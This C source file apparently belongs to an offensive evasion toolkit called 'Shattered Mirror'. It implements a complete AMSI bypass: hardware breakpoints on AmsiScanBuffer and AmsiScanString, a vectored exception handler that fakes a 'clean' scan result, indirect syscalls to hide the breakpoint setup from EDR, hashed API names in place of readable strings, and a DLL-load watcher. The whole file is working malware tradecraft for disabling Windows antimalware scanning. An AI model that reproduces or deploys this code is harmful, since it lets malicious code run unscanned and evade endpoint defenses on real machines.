/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: VEH AMSI Bypass (Hardware Breakpoints)
 *
 * Patchless AMSI bypass using Vectored Exception Handler + Debug Registers.
 *
 * Technique:
 *   1. Resolve AmsiScanBuffer address in amsi.dll
 *   2. Set a Hardware Breakpoint (DR0) on that address via NtSetContextThread
 *      → We use INDIRECT SYSCALL for this (EDRs monitor NtSetContextThread)
 *   3. Register a VEH as first handler (priority 1)
 *   4. When AmsiScanBuffer is called → EXCEPTION_SINGLE_STEP fires
 *   5. VEH catches it → sets RAX = AMSI_RESULT_CLEAN → skips function
 *   6. System thinks scan returned clean. No bytes modified. No integrity
 *      check failures. No ETW telemetry (because we blinded it first).
 *
 * 2026 Enhancement: The NtSetContextThread call to set debug registers
 * is made via indirect syscall, so even the ACT of setting the breakpoint
 * is invisible to EDR hooks on that function.
 *
 * Compatibility: Win10 1809+ / Win11 all builds
 * Build: MSVC x64 (/GS- /O2)
 *===========================================================================*/

#include "../Evasion_Suite/include/common.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include <tlhelp32.h>

/* Forward Declaration */
BOOL RegisterAMSIDllWatch(void);

/*---------------------------------------------------------------------------
 *  AMSI result codes
 *-------------------------------------------------------------------------*/
#define AMSI_RESULT_CLEAN  0
#define S_OK_AMSI          0

/*---------------------------------------------------------------------------
 *  Target addresses (resolved at runtime)
 *-------------------------------------------------------------------------*/
static PVOID s_pAmsiScanBuffer = NULL;
static PVOID s_pAmsiScanString = NULL;
static PVOID s_hVEH            = NULL;

/* DJB2 hashes — no static strings */
#define HASH_AmsiScanBuffer  djb2_hash_ct("AmsiScanBuffer")
#define HASH_AmsiScanString  djb2_hash_ct("AmsiScanString")
#define HASH_AMSI_DLL        djb2_hash_ct("amsi.dll")

/*---------------------------------------------------------------------------
 *  Vectored Exception Handler
 *
 *  When the hardware breakpoint fires on AmsiScanBuffer:
 *    - Exception code = EXCEPTION_SINGLE_STEP (0x80000004)
 *    - Exception address = AmsiScanBuffer
 *
 *  Our handler:
 *    1. Verifies the exception is from our breakpoint (check address)
 *    2. Sets RAX = 0 (AMSI_RESULT_CLEAN / S_OK)
 *    3. Advances RIP past the function (to the ret instruction)
 *       → We find the ret by scanning forward from RIP
 *    4. Clears the debug status register (DR6) to prevent re-triggering
 *    5. Returns EXCEPTION_CONTINUE_EXECUTION
 *
 *  The AMSI infrastructure thinks AmsiScanBuffer executed and returned
 *  "clean." Our code was never scanned. No bytes patched.
 *-------------------------------------------------------------------------*/
static LONG NTAPI VEH_AMSIHandler(EXCEPTION_POINTERS* pExInfo) {
    /* Only handle single-step exceptions (hardware breakpoints) */
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PVOID pExAddr = pExInfo->ExceptionRecord->ExceptionAddress;

    /* Check if this is OUR breakpoint (on AmsiScanBuffer or AmsiScanString) */
    if (pExAddr == s_pAmsiScanBuffer || pExAddr == s_pAmsiScanString) {
        /*
         * AmsiScanBuffer signature:
         *   HRESULT AmsiScanBuffer(
         *     HAMSICONTEXT amsiContext,  // RCX
         *     PVOID buffer,             // RDX
         *     ULONG length,             // R8
         *     LPCWSTR contentName,       // R9
         *     HAMSISESSION amsiSession,  // [RSP+0x28]
         *     AMSI_RESULT *result        // [RSP+0x30]
         *   );
         *
         * We need to:
         *   1. Set RAX = S_OK (0) — HRESULT success
         *   2. Write AMSI_RESULT_CLEAN (0) to the result pointer
         *   3. Skip the function entirely
         */

        /* Set RAX = S_OK (function "succeeded") */
        pExInfo->ContextRecord->Rax = S_OK_AMSI;

        /*
         * Write AMSI_RESULT_CLEAN to the result pointer.
         * The result pointer is the 6th argument → [RSP+0x30] in the
         * original caller's frame. At the point of exception (function
         * entry), RSP points to the return address, so:
         *   result = *(AMSI_RESULT**)(RSP + 0x30 + 0x08)
         *
         * Actually, at HW BP trigger (function entry before stack frame
         * setup), the stack has: [RSP]=retaddr, [RSP+8..]=shadow+args
         *   5th arg = [RSP + 0x28]  (amsiSession)
         *   6th arg = [RSP + 0x30]  (result ptr)
         */
        __try {
            ULONG_PTR rsp = pExInfo->ContextRecord->Rsp;
            PVOID* ppResult = (PVOID*)(rsp + 0x30);
            if (*ppResult) {
                *(DWORD*)(*ppResult) = AMSI_RESULT_CLEAN;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            /* If we can't write the result, that's fine — RAX=S_OK is enough */
        }

        /*
         * Skip the function: set RIP to the return address.
         * Return address is at [RSP]. We pop it by:
         *   RIP = *RSP
         *   RSP += 8
         */
        pExInfo->ContextRecord->Rip = *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += sizeof(ULONG_PTR);

        /* Clear DR6 single-step status bit to prevent re-trigger */
        pExInfo->ContextRecord->Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* Not our breakpoint — pass to other handlers */
    return EXCEPTION_CONTINUE_SEARCH;
}

/*---------------------------------------------------------------------------
 *  Set a hardware breakpoint on a specific address using debug registers.
 *  Uses INDIRECT SYSCALL for NtSetContextThread (2026 meta-evasion:
 *  EDRs monitor NtSetContextThread for debug register manipulation).
 *
 *  DR0-DR3: breakpoint addresses (we use DR0 for AmsiScanBuffer)
 *  DR7: control register (enable/disable, break type, length)
 *
 *  drIndex: 0-3 (which debug register to use)
 *-------------------------------------------------------------------------*/
static BOOL SetHardwareBreakpoint(HANDLE hThread, PVOID pTargetAddr, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return FALSE;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    /* Get current debug register state — via indirect syscall */
    NTSTATUS status = IndirectNtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) return FALSE;

    /* Set the target address in the chosen DR */
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)pTargetAddr; break;
        case 1: ctx.Dr1 = (DWORD64)pTargetAddr; break;
        case 2: ctx.Dr2 = (DWORD64)pTargetAddr; break;
        case 3: ctx.Dr3 = (DWORD64)pTargetAddr; break;
    }

    /*
     * DR7 configuration:
     * Bits 0,2,4,6 = Local enable for DR0,DR1,DR2,DR3
     * Bits 16-17, 20-21, 24-25, 28-29 = Condition (00=execute)
     * Bits 18-19, 22-23, 26-27, 30-31 = Length (00=1 byte)
     *
     * We want: execution breakpoint (condition=00), 1 byte (len=00),
     * locally enabled for our chosen DR.
     */
    ctx.Dr7 &= ~(3ULL << (drIndex * 2));           /* clear old enable bits */
    ctx.Dr7 |= (1ULL << (drIndex * 2));             /* set local enable */
    ctx.Dr7 &= ~(0xFULL << (16 + drIndex * 4));     /* clear condition+length */
    /* condition=00 (execute), length=00 (1 byte) → already cleared */

    ctx.Dr6 = 0;  /* clear debug status */

    /* Set the modified context — via indirect syscall (invisible to EDR) */
    status = IndirectNtSetContextThread(hThread, &ctx);
    return NT_SUCCESS(status);
}

/*---------------------------------------------------------------------------
 *  Remove a hardware breakpoint from a specific DR.
 *-------------------------------------------------------------------------*/
static BOOL ClearHardwareBreakpoint(HANDLE hThread, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return FALSE;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    NTSTATUS status = IndirectNtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) return FALSE;

    /* Clear the address and disable */
    switch (drIndex) {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
    }

    ctx.Dr7 &= ~(3ULL << (drIndex * 2));        /* disable */
    ctx.Dr7 &= ~(0xFULL << (16 + drIndex * 4)); /* clear cond+len */
    ctx.Dr6 = 0;

    status = IndirectNtSetContextThread(hThread, &ctx);
    return NT_SUCCESS(status);
}

/* Helper to apply our HWBPs to all existing threads */
static BOOL ApplyBreakpointsToAllThreads() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD currentPID = GetCurrentProcessId();

    if (Thread32First(hSnapshot, &te32)) {
        do {
            /* Only target threads inside our host process */
            if (te32.th32OwnerProcessID == currentPID) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread); // Must suspend to change Context reliably
                    if (s_pAmsiScanBuffer) SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
                    if (s_pAmsiScanString) SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);
    return TRUE;
}

/*---------------------------------------------------------------------------
 *  Install the AMSI bypass.
 *  Call after InitSyscallTable and BlindETW.
 *
 *  Steps:
 *    1. Check if amsi.dll is loaded (it may not be yet)
 *    2. If not loaded, register a DLL notification callback to catch it
 *    3. Resolve AmsiScanBuffer + AmsiScanString by hash
 *    4. Set hardware breakpoints on both (DR0 + DR1)
 *    5. Register the VEH (priority 1 = first handler)
 *-------------------------------------------------------------------------*/
BOOL InstallAMSIBypass(void) {
    /* Check if amsi.dll is already loaded */
    PVOID pAmsi = GetModuleBaseByHash(HASH_AMSI_DLL);

    if (pAmsi) {
        /* Resolve targets by hash */
        s_pAmsiScanBuffer = GetExportByHash(pAmsi, HASH_AmsiScanBuffer);
        s_pAmsiScanString = GetExportByHash(pAmsi, HASH_AmsiScanString);

        if (!s_pAmsiScanBuffer) return FALSE;

        /* Set Hardware Breakpoints on all threads. */
        ApplyBreakpointsToAllThreads();

        /* Register VEH — first handler (catches before any SEH) */
        s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
        return (s_hVEH != NULL);
    }

    /*
     * AMSI not loaded yet — this is common. amsi.dll is loaded lazily
     * when PowerShell or .NET CLR initializes.
     *
     * Strategy: Register the VEH now, and use a DLL load notification
     * (LdrRegisterDllNotification) to set the breakpoints when amsi.dll
     * eventually loads.
     */
    s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
    if (!s_hVEH) return FALSE;

    /* FIXED: Actually call the watcher so it hooks upon load */
    RegisterAMSIDllWatch();

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  DLL Load Notification — fires when any DLL is loaded.
 *  We watch for amsi.dll and set our breakpoints when it appears.
 *
 *  LdrRegisterDllNotification is resolved by hash from ntdll.
 *-------------------------------------------------------------------------*/
typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG             Flags;
    PSM_UNICODE_STRING FullDllName;
    PSM_UNICODE_STRING BaseDllName;
    PVOID             DllBase;
    ULONG             SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (NTAPI* PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG                       NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA  NotificationData,
    PVOID                       Context
);

typedef NTSTATUS (NTAPI* fnLdrRegisterDllNotification)(
    ULONG                           Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION  NotificationFunction,
    PVOID                           Context,
    PVOID*                          Cookie
);

#define HASH_LdrRegisterDllNotification djb2_hash_ct("LdrRegisterDllNotification")
#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

static PVOID s_pDllNotifCookie = NULL;

static VOID NTAPI DllLoadCallback(
    ULONG                       Reason,
    PLDR_DLL_NOTIFICATION_DATA  Data,
    PVOID                       Context)
{
    if (Reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
    if (!Data || !Data->BaseDllName || !Data->BaseDllName->Buffer) return;

    /* Check if this is amsi.dll loading */
    char szName[64] = { 0 };
    int len = Data->BaseDllName->Length / sizeof(WCHAR);
    if (len > 63) len = 63;

    for (int i = 0; i < len; i++) {
        WCHAR wc = Data->BaseDllName->Buffer[i];
        szName[i] = (wc >= L'A' && wc <= L'Z') ? (char)(wc + 32) : (char)wc;
    }
    szName[len] = '\0';

    if (djb2_hash_rt(szName) == HASH_AMSI_DLL) {
        /* amsi.dll just loaded — set our breakpoints now */
        s_pAmsiScanBuffer = GetExportByHash(Data->DllBase, HASH_AmsiScanBuffer);
        s_pAmsiScanString = GetExportByHash(Data->DllBase, HASH_AmsiScanString);

        if (s_pAmsiScanBuffer) {
            /* Set Hardware Breakpoints on all threads (the God-Tier Patch) */
            ApplyBreakpointsToAllThreads();
        }
    }
}

/*---------------------------------------------------------------------------
 *  Register the DLL load notification so we catch amsi.dll whenever
 *  it loads. Call this during Orchestrator startup.
 *-------------------------------------------------------------------------*/
BOOL RegisterAMSIDllWatch(void) {
    PVOID pNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!pNtdll) return FALSE;

    fnLdrRegisterDllNotification pfn =
        (fnLdrRegisterDllNotification)GetExportByHash(pNtdll, HASH_LdrRegisterDllNotification);

    if (!pfn) return FALSE;

    NTSTATUS status = pfn(0, DllLoadCallback, NULL, &s_pDllNotifCookie);
    return NT_SUCCESS(status);
}

/*---------------------------------------------------------------------------
 *  Remove the AMSI bypass (for cleanup / self-destruct).
 *-------------------------------------------------------------------------*/
BOOL RemoveAMSIBypass(void) {
    HANDLE hThread = GetCurrentThread();

    /* Clear hardware breakpoints */
    ClearHardwareBreakpoint(hThread, 0);  /* DR0: AmsiScanBuffer */
    ClearHardwareBreakpoint(hThread, 1);  /* DR1: AmsiScanString */

    /* Remove VEH */
    if (s_hVEH) {
        RemoveVectoredExceptionHandler(s_hVEH);
        s_hVEH = NULL;
    }

    s_pAmsiScanBuffer = NULL;
    s_pAmsiScanString = NULL;

    return TRUE;
}
